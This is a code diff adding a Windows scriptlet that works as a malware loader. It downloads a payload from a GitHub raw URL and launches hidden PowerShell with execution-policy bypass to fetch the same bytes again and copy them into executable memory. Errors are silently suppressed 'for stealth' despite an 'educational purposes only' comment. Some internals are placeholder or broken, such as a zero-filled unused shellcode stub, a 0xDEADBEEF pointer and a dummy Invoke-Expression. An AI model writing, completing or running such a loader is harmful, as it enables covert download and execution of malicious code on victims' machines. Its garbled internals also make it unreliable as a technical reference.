@@ -1,0 +1,71 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="MemoryLoader"
+    progid="MemoryLoader"
+    version="1.00"
+    classid="{12345678-1234-1234-1234-123456789ABC}">
+    
+    <script language="JScript">
+        <![CDATA[
+            // EDUCATIONAL PURPOSES ONLY - MEMORY EXECUTION ONLY
+            try {
+                var url = "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin";
+                
+                // Download payload to memory
+                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+                xhr.open("GET", url, false);
+                xhr.send();
+                
+                if (xhr.status == 200) {
+                    var payload = xhr.responseBody;
+                    
+                    // Convert to array for memory manipulation
+                    var shellcode = new VBArray(payload).toArray();
+                    
+                    // Allocate executable memory
+                    var memoryAddr = 0;
+                    var pageSize = 4096;
+                    var payloadSize = shellcode.length;
+                    
+                    // Use VirtualAlloc via Shellcode
+                    var allocCode = [
+                        0x48, 0x83, 0xEC, 0x28,                   // sub rsp, 0x28
+                        0x48, 0x31, 0xC9,                         // xor rcx, rcx
+                        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdx, payloadSize
+                        0x49, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r8, 0x3000
+                        0x49, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r9, 0x40
+                        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, VirtualAlloc addr
+                        0xFF, 0xD0,                               // call rax
+                        0x48, 0x83, 0xC4, 0x28,                   // add rsp, 0x28
+                        0xC3                                      // ret
+                    ];
+                    
+                    // Alternative approach using .NET for memory allocation
+                    var shell = new ActiveXObject("WScript.Shell");
+                    
+                    // Create PowerShell in memory to handle the payload
+                    var psCommand = "powershell -exec bypass -WindowStyle Hidden -Command \"";
+                    psCommand += "[System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices');";
+                    psCommand += "[System.Reflection.Assembly]::LoadWithPartialName('System.Net.Http');";
+                    psCommand += "$client = New-Object System.Net.Http.HttpClient;";
+                    psCommand += "$response = $client.GetAsync('" + url + "').Result;";
+                    psCommand += "$bytes = $response.Content.ReadAsByteArrayAsync().Result;";
+                    psCommand += "$size = $bytes.Length;";
+                    psCommand += "$mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((";
+                    psCommand += "[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.IntPtr]([System.UInt32]0xDEADBEEF)),";
+                    psCommand += "[Type]::GetTypeFromCLSID([Guid]'AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA'))).Invoke(0, $size, 0x3000, 0x40);";
+                    psCommand += "[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $size);";
+                    psCommand += "Invoke-Expression 'This technique requires additional setup';";
+                    psCommand += "\"";
+                    
+                    shell.Run(psCommand, 0, false);
+                    
+                }
+            } catch(e) {
+                // Silent fail for stealth
+            }
+        ]]>
+    </script>
+</registration>
+</scriptlet>
